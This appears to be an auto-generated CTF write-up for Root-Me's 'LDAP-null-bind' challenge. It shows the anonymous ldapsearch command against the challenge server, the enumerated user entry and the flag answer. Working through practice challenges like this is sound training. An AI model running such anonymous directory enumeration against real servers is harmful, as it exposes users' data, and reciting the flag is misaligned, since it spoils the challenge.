---
title: "LDAP-null-bind"
ctf: "Root-Me"
category: "network"
difficulty: "Not specified"
points: null
techniques: ["ldap"]
tools: []
keywords: ["LDAP-null-bind", "Root-Me", "network", "ldap"]
status: "solved"
has_script: false
source: "Root-Me/Network/LDAP-null-bind/note.md"
---

# LDAP-null-bind (Root-Me, network)

## Summary
Challenge **LDAP-null-bind** from the Root-Me CTF, network category. Main technique: ldap. ❯❯ ldapsearch -H ldap://challenge01.root-me.org:54013 -x -b "ou=anonymous, dc=challenge01, dc=root-me, dc=org" # # dn: ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass:OrganizationalUnit ou: anonymous dn: uid=sabu, ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: inetOrgPerson objectClass: shadowAccount uid: sabu sn: sabu cn: sabu givenName: sabu mail: sabu@anonops.org search: 2 result: 0 Success

## Statement and artefacts
❯❯ ldapsearch -H ldap://challenge01.root-me.org:54013 -x -b "ou=anonymous, dc=challenge01, dc=root-me, dc=org"

# #

dn: ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: organizationalUnit ou: anonymous

dn: uid=sabu, ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: inetOrgPerson objectClass: shadowAccount uid: sabu sn: sabu cn: sabu givenName: sabu mail: sabu@anonops.org

search: 2 result: 0 Success

## Recognition signals
Not specified.

## Resolution method
1. ❯❯ ldapsearch -H ldap://challenge01.root-me.org:54013 -x -b "ou=anonymous, dc=challenge01, dc=root-me, dc=org"

2. #
# LDAPv3
# base <ou=anonymous, dc=challenge01, dc=root-me, dc=org> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

3. # anonymous, challenge01.root-me.org dn: ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: organizationalUnit ou: anonymous

4. # sabu, anonymous, challenge01.root-me.org dn: uid=sabu, ou=anonymous, dc=challenge01, dc=root-me, dc=org objectClass: inetOrgPerson objectClass: shadowAccount uid: sabu sn: sabu cn: sabu givenName: sabu mail: sabu@anonops.org

5. # search result search: 2 result: 0 Success

6. #numResponses: 3
# numEntries: 2

## Flag
sabu@anonops.org

## Lessons and reusable patterns
- Main technique: ldap.
